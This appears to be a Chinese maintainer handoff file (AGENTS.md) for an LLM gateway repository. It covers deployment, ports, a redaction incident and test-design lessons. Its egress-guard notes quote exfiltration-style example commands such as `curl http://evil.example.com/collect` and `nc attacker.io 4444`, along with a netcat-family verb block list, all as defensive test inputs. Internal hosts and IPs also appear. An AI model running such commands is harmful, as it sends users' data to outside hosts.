# llm-gateway-go — AGENTS.md（维护者交接）

> 适用：未来任何 cold-start 切到本仓库的助手会话（不区分会话身份）。
> 写入时机：2026-10-09 首次生成；**2026-10-11 由 root 会话
> `mvs_d10f8ded3e7c4d73b8221fe670ddd9dc` 重写「工具链」与「已落地结论」两节**，
> 原文件关于「go/brew/docker 全部缺失」的判断已被实测推翻，见下。
> **2026-10-11 凌晨审计 pass**（会话在此 checkout 提交）：24h 窗口 63 提交逐条批判审计，
> 三族真问题修复，见「已完成」第 6 条与 `docs/audit/2026-10-11-24h-audit-pass.md`。
> 上下文：脱敏范围事故（地址被遮蔽成 `[REDACTED]`）的修复、245 部署验证与
> 随后的批判性审计。
> **2026-10-19 24h 审计轮**（本会话）：5 个本地未推送 dup 提交合并、bg/ 两族
> 假阳性 ERROR 收口（推送 `151a0ba13`），见下方「2026-10-19 24h 审计轮」节。

## 经验反馈闭环（vibe-coding Rule 66）

- 开始工作前阅读根目录 `LESSONS.md`、`.agents/rules/66-skill-evolution.md` 和本次改动涉及的模块规则；收尾时只记录可复用的返工、遗漏、验证盲区或风险。
- 每条经验包含根因、防复发检查、实际证据及任务/提交溯源。同一模式跨三个不同工作日复现后，晋级为项目规则、清单或技能；经证据确认的安全、隐私、数据丢失或生产事故可立即晋级。
- 代码审查结论绑定精确 `reviewed SHA`；审查后 diff 有变化，必须对最终 SHA 重审。未运行的验证明确标记原因。

## 仓库快照

- 路径：本仓在本机有**多份并发 checkout**（`llm-gateway-go`（本行提交所在）、
  `llm-gateway-go-cursor`、`llm-gateway-go-5`）——本行写不出唯一真值，提交前以 `pwd` 为准；
  两边同时 deploy 会互相抢 245 的部署锁（见下方「部署 245 的实操」）
- 远端：codeup.aliyun.com（`origin/main`）
- HEAD：见 `git log --oneline -1`。**不要照抄本文件的 commit 列表**——仓库多会话共享，
  本文件记录时点之后通常已有他人提交；以 `git log` 为准。
- 分支：仅 `main`；提交前先 `git fetch && git status -sb`
- Go 模块：见仓库根 `go.mod`；**`installer/` 是独立 Go 模块**（有自己的 go.mod），
  它的测试要在 `installer/` 目录内跑，从根模块用 `./installer/...` 会报 setup failed
- 入口二进制：`cmd/gateway/main.go`（v1）、`cmd/gateway-v2/main.go`（v2，独立）

## 本机工具链（2026-10-11 实测，原「全部缺失」的结论已作废）

| 工具 | 状态 | 说明 |
|---|---|---|
| `go` | Homebrew `/opt/homebrew/bin/go` **1.27.2**（2026-10-16 `brew upgrade go`） | 在 PATH 上；`~/sdk/go` 已不存在。须 ≥ `go.mod` 的版本，否则 deploy-seamless（`GOTOOLCHAIN=local`）回退 amd64 容器构建。`/usr/local/go` 1.24.5（root）排在其后不生效 |
| `bash` ≥4 | `~/sdk/bash5/bin/bash` 5.2.0 | 系统只有 3.2，deploy-lib 用到 `${var^^}`（bash 4+）必须用这个。**2026-10-11 下午曾被整目录清掉**（`~/sdk/` 只剩 go/caddy/缓存），已按下方重编法重建回原路径——`~/sdk/` 下的工具可能被清理，用前先 `ls` 确认 |
| `pnpm` | `corepack prepare pnpm@10.29.2` | 仓库 `packageManager` 锁 10.29.2 |
| `node` | nvm 24.21.0 | 在 PATH 上（22.23.3 已被升级替代） |
| `brew` / `docker` | **确实缺失** | 真库回归（full 模式）仍做不了；host-first 本地部署不依赖它们 |
| `psql` | `~/kaixuan/pg18/bin/psql` | host pg18 自带；**不在 PATH 上**，或跑部署时把该目录加进 PATH |

> bash 5.2 若需重编：`~/sdk/bashbuild/bash-5.2`。构建时
> `builtins/psize.sh` 的 `mktemp` 会被沙箱 wrapper 污染，生成物 `pipesize.h`
> 会混入 `mavis-trash:` 字样导致编译失败（`unknown type name 'mavis'`）。
> 已把该脚本改为直接输出固定值 `PIPESIZE 65536`。重编时注意这一点。

## host-first 本地部署（2026-10-11 落地，本仓 llm-gateway-go-2）

- 方案文档（发现链/自动安装/域名/验证矩阵）：`docs/06-deployment/01-environments/local-host-first-deploy-20261011.md`
- 部署：`LLM_GATEWAY_ROOT=~/kaixuan/llm-gateway-go-v2 PATH="$HOME/sdk/go/bin:$PATH" GOPROXY=https://goproxy.cn,direct GOMODCACHE="$HOME/sdk/gomodcache" GOCACHE="$HOME/sdk/gocache" bash scripts/deploy-local.sh deploy`（active 8782）
- 发现链：caller 显式配置 → 主机原生服务（本机 pg18:54318 + redis:6379，含 PATH 注入）→ docker → 自动源码安装（PG17 最新小版本 + pgcolumnar v1.0-alpha4（Citus columnar 独立发行）+ Redis 7.4.2）
- 密钥在仓库 `.env.local`（gitignored，含 admin 凭据）；缓存=host redis，数据=host pg18
- 域名：`llm.itestu.cn` → NetBird DNS zone `llm-itestu-zone` A 记录 → 100.106.169.63:8782（本机 peer nb-macmini-29）。**两条入口并存**：mesh 内（NetBird zone，:8782/:8443）+ 公网（公网 DNS → 252 nginx 443 SNI 透传 → 9443 TLS 终结 → mesh 8782）；远端回连已于 2026-10-11 经 252 实测通过（公网证书免 -k 校验通过）。
- **2026-10-13 增补：mesh 内 `https://llm.itestu.cn`（标准 443）曾断裂**（NetBird 解析到 mesh IP 但 mac 只听 8443 且自签证书）。已修：mac Caddy 加 `:443` 腿，服务**从 252 同步的 LE 公网证书**（`setup-caddy.sh DL_PUBLIC_TLS=1` + 新增 `scripts/sync-public-cert.sh`，mac mini crontab 每日 04:26 拉取变更才 reload）。内外网三路径（mesh 443 / LAN 192.168.31.40:443 / 公网 252 链）全绿，4 模型 API 实测通过；拓扑与坑（手启旧 caddy 无 pidfile 不被 --stop 清、BSD 多进程可共听同端口、macOS 非特权可绑 443）见部署文档 §5.3。
- **坑（2026-10-11 实测）**：
  - **252 上 mihomo（tun+fake-ip，`dns-hijack any:53`）会劫持 mesh 域名解析**：252 按 `llm.itestu.cn` 访问网关超时而按 IP 正常。已修：`/etc/mihomo/config.yaml` 加 `fake-ip-filter: +.llm.itestu.cn` + `nameserver-policy +.llm.itestu.cn → 100.106.190.139`（252 netbird 解析器），API 热重载。**策略不可放宽到 `+.itestu.cn`**（netbird 上游转发同样被劫持，会弄坏兄弟 vhost）。详见 host-first 部署文档 §5.1。
  - **252 的 netbird 客户端是 podman 容器 `nb-252-host`**（非宿主服务；二进制在镜像里，状态盘 bind-mount 在 `/opt/netbird/openpocket/nb-252-host-state`）。管理用 `netbird-252 status -d`（宿主封装=`podman exec`）；重启 `podman restart nb-252-host` 实测 peer 身份/IP 保留、三链路自愈。代理订阅已从陈旧内联快照改为 efanyun provider（与 mac network-switch 对齐，103 节点全活）。⚠️ 手工改 252 mihomo 组配置按 `^- ` 切块而非 `^- name:`（Auto/Cursor-Direct 首键是 `- interval:`）。
  - `com.kaixuan.llm-gateway` launchd 代理已停用（备份 `~/kaixuan/llm-gateway-go-v2/backups/`）——KeepAlive 重生网关会跟 deploy-local 的 nohup+pid 生命周期互踩（抢 8781 候选端口）；
  - **host-first 部署前必须先装前端依赖**（`web/`、`web-mobile/` 各自 `corepack pnpm install --frozen-lockfile`）：`web/node_modules` 缺失时 `build_frontend` 只 warn 不拒绝，会把**空 web/**（仅 version.json）staging 进发布包，网关静态探测回落源码 `web/` 发出未构建的 Vite 模板 → 浏览器白页（2026-10-11 下午 2538 轮事故，2539 修复）；建议后续给 deploy-local 补 refuse 门。另一紧邻缺陷已修码（r2540）：SPA 顶层路由（/dashboard 等）深链/刷新曾 401 `missing_key`——`AuthMiddleware` 现按 `Accept: text/html` 导航放行（/v1、/mock、/plugins 除外），见 middleware/auth_mw_test.go 三件套；详见部署文档 §5.2。
  - 最新 macOS SDK（27.0）与 CLT 链接器不兼容（tapi error），`dl_resolve_sdkroot` 自动降级（当前 26.5）；裸 `go run`（cgo 形态）会 SIGSEGV，用 CGO_ENABLED=0 + SDKROOT 钉扎；
  - PG 的 E'' 替换串里 `\1` 是八进制转义不是 backreference；视图族有冻结/动态交集两代合法形态，通道文件按形态探测分支。
- 契约门：`bash tests/deploy_host_first_contract_test.sh`（verify.sh 已接）；自动安装端到端：`DL_AUTOINSTALL_TEST=1 bash tests/deploy_host_autoinstall_test.sh`（真实源码构建，分钟级，opt-in）
- 迁移通道 host-first 收敛轮补登：532/392/631/407/536/540/510/513/516/542/361b + 新增 680b；738/740/815/816/817/824 兼容动态交集形态。

## `/live` 的免凭据肉眼验收路径（2026-10-18 实测可用）

**要肉眼验收 `/live` 千万别先去要管理员口令** —— 生产路由确实要登录，但仓库自带一条
免凭据的路：`/dev/live-topology-preview`（只在 `import.meta.env.DEV` 注册，
`meta:{public:true}`，路由门对 `/dev/` 前缀直接放行）。

```bash
node /tmp/dev-topology-stub.mjs 5198                        # API 桩（/tmp，不进仓库）
cd web && GATEWAY_API_TARGET=http://127.0.0.1:5198 \
  corepack pnpm vite --port 5199 --strictPort               # 只听 IPv6 回环
# 浏览器开 http://localhost:5199/dev/live-topology-preview
```

- 桩需覆盖：`/api/admin/topology/providers-today`、`/api/auth/me`（401）、
  `/api/admin/live-stream`（SSE）。`/api/auth/me` 返 401 会让首屏停在
  「正在检测登录状态…」**片刻**，导航等它落定后正常渲染 —— 这**不是**故障，
  别照着去调代码。
- 探活用 `localhost`（vite 绑 `::1`），`127.0.0.1` 连不上。
- FilePanel Browser 的 `screenshot` 对这页会抓成黑底空图，但 DOM 查询同时能读到
  完整结构、控制台零报错 ⇒ **判「元素在不在」用 DOM/文本查询，别信截图**；
  `query(kind:'editable')` 不收 selector，查可交互元素用 `kind:'semantic'`。

## 端口：必须现场确认，不要假设

两台机器都是蓝绿部署，监听端口由 `/opt/llm-gateway-go/run/active-upstream.conf`
决定，nginx 用 `upstream llm_local { include … }` 引用。

- 2026-10-10 实测：154 与 245 均在 `:8782`。
- 2026-10-11 实测：**245 的活跃端口漂到了 `:8782`**（deploy handoff 输出
  `active_port=8782`），`:8781` 无监听。部署期间发生过与另一份 checkout 的并发部署。
- 2026-10-15 17:5x 实测：**两台又对调了**——154 在 `:8782`（`2651-6dc0ad45`）、
  245 在 `:8781`（`2650-6dc0ad45`），与 2026-10-11 那次正好相反。**端口是蓝绿切流的
  副产物，每天都可能再变**，任何「154 在 8781」的记忆都当过期处理。

探活一律两个端口都试：`curl -s http://127.0.0.1:{8781,8782}/readyz`。
直连 8781 得到 connection refused **不代表故障**，只代表端口没在用。
真要确认「当前谁在服务」，读 `run/active-port` + `readlink -f /opt/llm-gateway-go/current`，
两者 + `version.json` 的 `build_seq` 三处对齐才算证据。

## SSH：必须走别名，不能用裸 IP

`~/.ssh/config` 里 `245` / `154` / `252` 都配了 **`Port 25022`**。
用 `ssh root@8.136.114.245`（裸 IP）会走 22 端口并被对端在 KEX 阶段断开，
表现为 `Connection closed by ... port 22` —— 看起来像目标机挂了，实际是端口错了。
**一律用 `ssh 245` / `ssh 154` / `ssh 252`。**

## 本轮已落地：脱敏范围事故

用户报告会话里出现 `export https_proxy=http://[REDACTED]:7890`。分析发现是
**三条互相独立的遮蔽链路各自在遮地址**，只修一条不够：

1. `security/sanitize` 的 `server_ip`/`internal_ip` —— 一条规则同时承担
   「替换请求文本敏感值」与「判定模型是否外传」两个职责。已引入
   `DetectionScope` 拆分：`ScopeRedact`（默认，不含地址）/ `ScopeEgress`
   （仅 tool 参数防外传守卫用）。
2. `pii_patterns.ip_address` —— 316 迁移播种的 DB 规则，正则宽到连环回与
   版本号一并命中。已由 **851 迁移**停用（UPDATE 非 DELETE：316 是幂等播种，
   删行会被重放种回来）。
3. `domains/outputcompliance` 的 `detectInternalIP` 默认动作 redact。
   已改为 `log`：**只撤遮蔽、不撤检出**，审计台账仍看得到命中。

遮蔽标记同步改为带类型：`[REDACTED:phone]` / `[REDACTED:secret]`。

分析与变异验证详见 `docs/audit/2026-10-10-脱敏范围与遮蔽标记.md`。

## 判据设计的硬教训（本轮最贵的两条）

1. **判据必须与被测函数在同一层。** r1014 第一版把断言写在 SSE 流式链上，
   对核心逻辑的极端变异（豁免恒 false / 恒 true）**0 条失败** —— 全绿但无效。
   改判据时又把 `arguments` 写成 JSON 对象而非 JSON 字符串字面量，整帧非法
   JSON、守卫压根走不到检查，公网用例反而全绿。改用 `unsafeToolValue`
   直接驱动守卫判定入口后才可信。
2. **用内置 `NewPatternDetector()` 写的地址类判据一律是假绿。** fallback 的
   `defaultPatternEntries` 里**没有任何地址规则**，所以这类判据不可能失败。
   地址相关判据必须用 `NewPatternDetectorFromFile("../../configs/sensitive_patterns.yaml")`。
   r1010 那条就是这么漏掉了私网阻断的真实缺陷（dc63f19ff 修复）。
3. **「没被阻断」有两种成因，必须把「看不见」单独判掉。** 允许侧用例绿，可能是
   （a）命中豁免放行，也可能是（b）检测器压根没匹配到该地址。b 是假绿，且
   **变异验证也测不出来**（因为它没有改逻辑，只改了「看不见的范围」）。
   2026-10-11 实测：把 `server_ip` 正则收窄成只匹配 `127.*` 后，
   `TestR1014NonExfiltrationAddressesAreNotBlocked` **依然全绿**，
   而新增的 `TestR1014AllowedAddressesAreActuallyDetected` 红了 7 条。
   凡是有「允许侧」判据，都配一条「前提仍在场」的断言。
4. **证明「既有失败与我无关」有两种强度，别混着用。** 强：`git worktree add` 到
   pristine HEAD 复跑（admin 3 条用的是这个）；弱：`go list -deps` 确认目标包
   不依赖被改包（`domains/hooks/handoff` 的 `Test244WideningRuleShrinksGap`
   用的是这个——它不依赖 `security/sanitize`，所以我的改动在因果上不可能影响它）。

写完判据后**必须做变异验证**（把被测逻辑改坏，确认判据变红），否则不知道它
是否真的在测东西。

## 2026-10-17 轮：审计方法论增量（本轮最贵的三条）

5. **「分支 diff 非空」≠「分支有未落地内容」。** 裁决未合并分支时，
   `git diff main...branch` 在 merge-base 距今很远时反映的是**双向漂移**。
   正确判据是逐特征/逐文件去 main 找等价物：本轮 7 条分支里，
   `fix/w5-ml-ci-runbook` 的 diff 显示 7 文件全非空，但实质代码已独立落地
   （`annotation_require_known_label` 默认 True、CI 工作流、runbook 全在 main）；
   `2026-07-25-realtime-routing-self-heal` 的 24 个文件，24/24 在 `docs/archive/`
   下有**逐字节相同**副本（其中 1 个是同名不同文档，换比 specs/ 才确认）。
   ⇒ 照搬反而会回退后续演化。详见
   `docs/audit/2026-10-17-24h-audit-branch-adjudication.md`。
6. **`last_analyze` ≠ `last_autoanalyze`。** 判断「某表有没有被统计过」时，
   前者只记手工 `ANALYZE`，后者才记 autovacuum。用错列会把
   「autovacuum 正常工作的 heap 表」（实测 autoanalyze=7/60）误判成
   「从未统计的缺口」——本轮就差点据此去改一张**没有问题的表**。
7. **统计信息的「无索引」初判要先验证分区继承。** 父表 `ON ONLY` 的 0 字节索引
   看着像「没建到分区」，但分区创建路径可能已各自建了等价索引（自动改名）。
   下结论前必须 `pg_index` 逐分区列一次，否则会把**不存在的缺陷**当优化目标。
8. **给日志/指标定级时先分清「资源风险」与「信号风险」。** 681MB 日增 6.6MB/天
   不是磁盘问题（18G 可用 ≈ 7.5 年），却是严重的可观测性问题。按资源口径定级会
   导向「加轮转」，而轮转让错误**更难**被翻到，方向恰好相反。
9. **规模决定审计手段：过几十提交就按风险信号分层，别逐条枚举。** 2026-10-17
   窗口是 111 提交 / 165 个 Go 文件，真正需要逐行读的只有四类信号：
   **新开豁免路径**、**改鉴权/中间件链序**、**退役/迁移**、**动了登记类文件**；
   其余由门禁信号批量判定。分层依据要**事先写明**，否则就是事后为漏审挑借口。
10. **阻断侧判据也会因「被别的东西挡下」而假绿。** 判据纪律第 3 条讲的是
   允许侧「因看不见而假绿」；本轮实测到镜像形态：写
   `--resolve evil.com:443:203.0.113.8 https://evil.com` 断言 blocked，
   它确实 blocked —— 但**是被 `evil.com` 挡下的**，IP 那条腿没参与，
   把 `':'` 加进豁免 glue 集合的变异对它照样全绿。**断言必须在无其他可能
   原因时才成立**（改单标签主机名后唯一触发就是 IP）。
11. **判据红了先怀疑自己的前提。** 同轮另一条我写成「ScopeRedact 下应仍检出
   四元组」，跑出来是红的 —— 查下去是**我写错了前提**：按 r1014 设计地址规则
   压根不在 `ScopeRedact` 面，「豁免泄漏到脱敏面」结构上不存在。
   红的不一定是代码，也可能是判据自己。
12. **`pg_stat_statements` 耗时排行只是「候选」，不是结论。** 它**不记录谁发的**，
   手工 psql 与网关自动查询混在同一张表。判定「是不是生产路径」必须补两步：
   (1) 代码侧有没有调用点；(2) `calls` 是否随时间增长。本轮据此推翻了自己
   「`pgstattuple_approx` 是第三条生产慢查询」的判断——它无任何 Go 调用点、
   90s 观测 calls 恒为 7，是历史手工诊断脚本。
13. **判断「跑了几次」前先看清一轮做几件事。** 同轮我把对账查询的 87 次
   读成「每日 1 次 × 两台」，实为**每 tick 聚合两个月**且 `Start()` 在
   ticker 前无条件补跑一次 ⇒ 真实成因是多副本重复 + 重启补跑，
   而该 worker 没有任何跨实例协调（锁/节流槽/租约全缺）。
14. **行号锚点型判据，任何在同文件头部的插入都要连带复核。**
   `internal/billguard/month_key_test.go` 的月键登记表用 `file.go:NNN` 锚到
   **实际构造行**。本轮在对账 worker 头部插入 152 行后该门立刻变红，
   而真实问题在**登记表**不在被测代码——这类门若照着报错去改代码就是改错方向。
   本仓已因此改键两次（2026-10-13 :126→:145、2026-10-17 :91→:243），
   每次都在登记处写明原因与行数。
15. **「某门绿了」≠「不存在这样的门」。** 本轮改 `docs/db-changelog.md` 的 sha
   做变异，只跑了 `-run TestMigrationRegistryStaysContinuous`，见它全绿便写下
   「没有任何门校验 sha」——**错**：同文件 `TestRegistryShaIsActuallyTheFile`
   正是那道门，改错 sha 它会红并点名文件。
   下「不存在某能力」这类结论前，先把该处**全部**相关门列全再逐个验，
   否则会照着错结论造出一道与已有判据重复的门。

### 2026-10-17 `/live` 展示审计轮：判据把错误行为钉死了

17. **判据会把错误行为钉死，而且带着注释显得很有理。** 本轮 BLOCKER 是
    `gatewayModuleStats` 把**缓存命中数**累加进 `errors` 位，而
    `GatewayCoreBox` 用 `errors > 0` 决定画红 ⇒ 缓存工作正常显示成故障红。
    原有判据 `liveTopologyFilter.test.ts:152-153` 不仅全绿，还写着
    「缓存命中记在 errors 位（错放在 count 上会把『命中』读成『流量』）」——
    **这条注释在论证一个错误结论**，读起来比代码更像结论。
    ⇒ 判据红了要查前提，绿了更要问「它在钉什么」。写「为什么不那样写」的
    注释时，先确认被否掉的那个方案真的是错的。
18. **计数器可能在结构上恒为 0，而它自己看不出来。** `droppedByWindow`
    累加在 `buildTopology` 里，但 `applyFilters` 已先按窗口筛过一遍，
    `buildTopology` 的输入里**根本没有窗口外的请求** ⇒ 那个字段恒为 0，
    于是「有 UI 消费它」的假象比「没人消费它」更隐蔽。
    ⇒ 判据里凡是断言「某计数 > 0」的，必须确认它有**独立于自身的路径**
    能让它非零；这类「算了但恒零」靠读代码看不出来，要靠构造夹具打进去。
19. **`getComputedStyle` 在本仓 vitest 里恒为空串**（配置未开 `css`，
    SFC 的 `<style scoped>` 根本不进 jsdom）。用它断言样式 =
    **恒假绿**，测不到任何东西（判据纪律第 3 条的镜像形态）。
    样式契约要断言时直接读源码文本（本轮用 `process.cwd()` 相对路径 ——
    这套配置下 `import.meta.url` 不是 file scheme，会抛
    `TypeError: The URL must be of scheme file`）。

16. **「在生产上 A/B 验证过」≠「已上线」。** 本轮 quality-service 日志分流
   修复是在 245 上**手工跑新二进制**做 A/B 的（stdout 12 行 / stderr 0 行），
   证据完全成立——但现网进程 58 天没重启，`/proc/PID/exe` 指向的仍是
   **7-19 的老二进制**，修复压根没上线。根因是 `scripts/` 下**零个**脚本
   引用该服务：蓝绿发布只管 `releases/<seq>-<sha>` 与端口切换，而它是
   **独立 systemd 单元 + 静态 `ExecStart` 路径**，不在发布链上。
   ⇒ 凡要说「已上线」，必须核对**运行中进程持有的二进制身份**
   （`/proc/<pid>/exe` 的 inode 与 mtime、`ExecStart` 指向、`ps lstart`），
   而不是看当前 release 目录的 sha——后者只能证明「构建产物里有」。
   ⇒ 推论一：旁挂服务（不在 `scripts/` 发布链里的 systemd 单元）**默认不在发布链上**，
   修复它们的成本要单独算，不能并进「本轮已上线」的清单。
   ⇒ 推论二：新旧行为差异越大，A/B 越容易掩盖「没切换」——
   因为手工跑新二进制时现场是**对的**，只有回到「谁在服务」才暴露。
17. **阈值型判据先量「噪声底」，再信它的阈值。** 本轮发现主网关
   `resource_monitor` 的泄漏告警 6646 条全是误报：判定只比较**相邻两个
   采样点**（默认 30s），阈值 10MB/min 折到 30s 只需 **5MB 差值**，
   而 RSS 的 GC 锯齿实测 **±35~70MB**（周期 2~3 分钟）——噪声比门槛大一个
   量级，于是 100% 触发。⇒ **凡是「超过阈值就报」的判据，先把阈值折算到
   它的实际判定窗口，再和该信号的实测噪声幅度比一比**；差距不到一个量级
   就说明阈值没有判别力。⇒ 修正方向是「跨窗口趋势」而不是调阈值
   （调阈值只是把误报率挪个位置，噪声仍在）；代价（发现延迟 = 窗口、
   阈值语义从瞬时变持续）必须写进注释，别让下一个人以为是白捡的。
18. **电平判定不要挂到趋势判定的提前 return 之后。** 本轮改泄漏判定时
   把 goroutine 检查（`count > threshold`，电平）挪到了窗口基线的
   `if base == nil { return }` 之后，等于让它被 15 分钟窗口门控、静默停摆。
   是把原本只 `t.Log` 的空判据 `TestLeakDetection` 补成真断言后当场抓到的。
   ⇒ 同一次判定里的**不同判据可以有不同的时间语义**，不要因为共用一个函数
   就让它们共用同一个 gate。
19. **合成夹具只能证明「我构造的噪声被消掉了」，定 operating point 必须上真数据。**
   本轮泄漏判定先按直觉把窗口设成 15 分钟，合成锯齿判据全绿就收工。
   后来把生产真值序列（245 上 14.7 小时真实 RSS，已知无泄漏）固化成
   `pkg/monitor/testdata/` 夹具、用真实实现逐档扫，才发现：
   10 分钟是**首个误报归零**的窗口，且同样零误报下比 15 分钟**多抓到一档**，
   我拍的 15 分钟是**严格更差**的 operating point。
   ⇒ 凡是要定「参数默认值」而不是「逻辑对不对」的改动，
   必须有一份**真实采集的、且真值已知**的数据来扫；
   合成数据的噪声形态是你自己想象的，采样抖动/跨时段/负载交织它覆盖不到。
   ⇒ 同一次测量还纠正了我一个错误结论：我写「新算法把慢泄漏也漏了」，
   实测显示**旧算法在干净数据上就报 514 条**、真泄漏只多报到 537，
   只差 4% —— 那种「敏感」分辨不出有没有泄漏，是噪声不是检出能力。
   **别把噪声当检出。**

### 2026-10-18 `/live` 窄屏布局轮：枚举方向错了五次，而判据全绿

20. **「不越界」「不重叠」两条判据会被「什么都没画」同时满足。**
    本轮 `fitRow` 的枚举方向写反后**恒返回 1 张卡**，而单卡必然既不越界
    也不重叠 ⇒「never overflows」「no overlap」两条判据全绿。
    ⇒ 几何类判据必须补一条**正向**下限：「宽屏就该画多张」
    （`fitRow grows with width`，1440 ≥ 6 张）。**只断言「没坏」的判据，
    在「干脆没做」面前永远是绿的。**
21. **改坏同一个数字反复出现 3 次以上，先怀疑自己的证据链，不是代码。**
    本轮连续三轮报错**逐位相同**（`expected 164 to be ≥ 214`），我仍在
    改代码。真相是判据的分母/公式与实现不自洽。判据连续三次报同一个数时，
    **先写探针脚本把中间量打出来**（`expect(out).toBe('X')` 强制失败把
    数据带进报错），比再改一版快得多。本轮靠它一次定位。
22. **「折叠/降级」必须先验它自己放不放得下。** 折叠节点也是一张卡；
    只验「可见卡放得下」会漏。本轮 320px 下折叠位被挤出右边界，
    336px 下 2 张卡「塞得下但间隙仅 4px」。⇒ 可行性校验要用**同一套
    槽位模型**验「折叠后全部卡片 + 间隙 ≤ 可用宽」，且**要求留得出
    最小间隙**，不是「塞得进去」。
23. **jsdom 的 `getBoundingClientRect()` 恒返回 0。** 任何按容器尺寸分支的
    组件（响应式布局、按宽度折叠…）在单测里都会退到最小尺寸分支。
    本轮它让 `LiveTopologyView.filters` 误红（节点被折进「+N」）。
    ⇒ 这类组件的测试要在 `beforeAll` 里 stub `getBoundingClientRect` 给真实
    宽度；**该修的是夹具，不是放宽断言** —— 组件按宽度折叠是正确行为。
24. **固定宽度的元素排布，要先问「放得下几张」。** 本轮两个缺陷同根：
    卡片固定 150px 而槽位 = `spanW/(n+1)`，于是 1440 摊 8 张时槽位 138 <
    150、每张压 12px，1024 压 58px。**重叠与裁切是同一类「看不见信息」
    的缺陷**，但只有裁切会被列进遗留项 —— 重叠读代码看不见，得算。
    ⇒ 取舍要写明：「**卡宽可读优先于张数**」，宁可 6 张 150px 而不是
    12 张 105px。放不下的折叠成「其他 N」并求和流量，**不许静默丢弃**。

### 2026-10-18 `/live` 折叠轮：审计自己刚写的改动

25. **「聚合标签」要看量纲对不对，而不是看它变不变。** 折叠节点原标签
    `+${hidden.length}` 是**节点个数**：同一份数据 1440 显示「无折叠」、
    480 显示「+7」，用户会把**屏幕窄**误读成**流量变了**。改成报
    被折叠的**请求量**。
    ⇒ 关键在于分清两种「变化」：折叠量随宽度变是**正确行为**（窄屏折得多），
    标签的**量纲**错才是缺陷。一开始我把判据写成「标签不随宽度变化」，
    被自己的实现当场打脸 —— 那是个错误命题。
26. **折叠/合并会改写 id，而消费者还拿着旧 id。** 折叠把节点并进
    `model:folded:8`，布局边 id 随之变成 `client:x->model:folded:8`，
    而视图 `edgePathFor` 产出的是**原始** `client:x->model:deepseek-chat`
    ⇒ 高亮按 id 比对永远对不上，**点面板条目在窄屏下毫无反应且无报错**。
    ⇒ **任何「按 id 引用」的数据在折叠/聚合后都要保留来源 id**
    （本轮加 `sourceIds`）。判据要**同时覆盖数据侧与消费侧**：
    只测「sourceIds 记全了」测不到画布没去读它。
27. **画布类组件在 jsdom 里测不到渲染层**（拿不到 context）。
    ⇒ 把判定逻辑**抽成纯函数**再单测（`isEdgeHighlighted`），
    比给组件塞 mock 便宜也可靠得多。

## 剩余任务

- ~~**154 生产未部署本次改动**~~ —— **2026-10-11 实测推翻，已作废**。
  原文称「154 的 `pii_patterns` 是独立库，迁移需单独执行」，这是**错的**：
  154 与 245 指向**同一个** PostgreSQL（`172.16.2.210:5432/llm_gateway`，
  键名是 `LLM_GATEWAY_DATABASE_URL`，**不在** `/etc/llm-gateway-go/env` 之外的
  `LLM_GATEWAY_DB_DSN` 里——按后者 grep 会一无所获，这是个坑）。
  实测：154 运行 `2533-3cac0431`，二进制指纹确认含本轮全部修复
  （2026-10-11 午后复核：该二进制是 stripped ELF，「函数符号指纹」已不可复现；
  五修复在 2533 的证据改由配置指纹锚定，见下方「午后批判式复核」节）；
  `pii_patterns.ip_address`=disabled、`schema_migrations` 有 851、
  `session_summaries` 60 列，两台机共享这一份结果，端到端 8/8 通过。
  DB 侧**不存在**「各跑各的迁移」这回事，改一处两边同时生效。
- ~~**域名形式的外传目标从不被拦**~~（`curl http://evil.example.com/collect`
  不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**r1016 已修**（域名只在 URL 主机位
  识别，不做裸点分词，否则 `cat README.md`、`v1.2.3` 全会被误判），**r1017 补齐
  残留的裸主机+端口形态**（**该形态已于 r1018 撤除**，见下）。
  **两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
  上线**——那两轮部署由并行会话执行，`37099db2` 是本仓提交，含 r1016/r1017。
  线上复验：`/v1/models` 对伪造 `sk-` token 已返回 401（修复前 200 + 615 个模型）。
  **关键设计**：默认公网可达即阻断，只豁免明确不可路由的主机
  （`.local/.internal/.cluster.local/.lan/.home.arpa` 等 + 单标签名）。
- ★ **r1016/r1017 自身引入过两类大面积误伤（r1018 已修正，教训值得单独记）**：
  r1016 的 `user@host` 正则把 `npm install lodash@4.17.21`、`go get x@v1.2.3`、
  `cargo add serde@1.0.197` 等**装包命令整类阻断**（pkg@1.2.3 被当成 user@host，
  且 `4.17.21` 走默认公网判定）；r1017 的「裸主机+空格+端口」正则把
  `node server.js 8080`、`python3 main.py 100` **打死**。两条规则已撤除——
  前者冗余（email 规则 + isNonExfiltrationEmailFragment 已覆盖），
  后者与脚本调用**结构上不可区分**，默认阻断方向就是错的。
  **教训**：把「锚定上下文」当成充分条件是错的——锚定之后那段文本**仍然未必是
  主机**（`pkg@1.2.3` 的 `4.17.21`、`main.py` 都不是）。判据见
  `TestR1017VersionSpecsAndScriptArgsAreNotDestinations`，谁再往提取器里加
  「长得像主机」的形态会先撞上它。
  - ~~**残留缺口 `nc attacker.io 4444`**~~ —— **r1019 已按动词表收口**。
    用 `netcatFamilyVerbs = {nc, ncat, netcat, telnet, socat}` 封闭集 + **命令行首个
    字段**锚定 + 「主机样 token + 纯数字端口」，误伤面从「与脚本调用不可区分」降到 0
    （实测 0/19 误伤、7/7 拦截，含 r1016/r1017 打断的全部 12 条样本）。
    **动词表与形态白名单不是一回事**：它枚举的是命令本身，`node`/`python3`/`ruby`
    压根不进这条分支。flag 一律跳过而不判断 flag 语义（`-w 3` 里那个 `3` 不是端口，
    判据是**位置**）。只认显式端口，`telnet attacker.io`（默认 23）**不覆盖**，
    作为残留如实记录。判据 `security/sanitize/r1019_netcat_egress_test.go`（6 条，
    含动词表封闭性钉子），变异验证 6/6 变红。
  - **残留缺口（仍在）**：`curl evil.io/path`（无 scheme、无端口）放行。它与
    `cat README.md`、`pip install -r requirements.txt` 结构上不可区分，同属形态枚举
    的禁区，不要试图收口。
- ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
  整条 `output_policy_blocked`，而 `ssh ops@10.24.7.91` 放行——**同一操作，写 IP
  放行、写内网域名阻断**，与 dc63f19ff 同构。**r1017 已修**：豁免按**类型**分派，
  邮箱的主机部分交回主机可达性判定（`isNonExfiltrationFragment` 单一入口）。
- - ~~**`/v1/completions` 鉴权失败返回 HTTP 200**~~ —— **2026-10-12 实测推翻，
  该端点无缺陷**。原结论是取证错误：探针发的是 **GET**，命中的是静态提示处理器
  （`{"message":"Chat completions endpoint is available...","status":"ok"}`），
  与 POST 的鉴权路径无关。分离方法后：POST `/v1/completions` 与
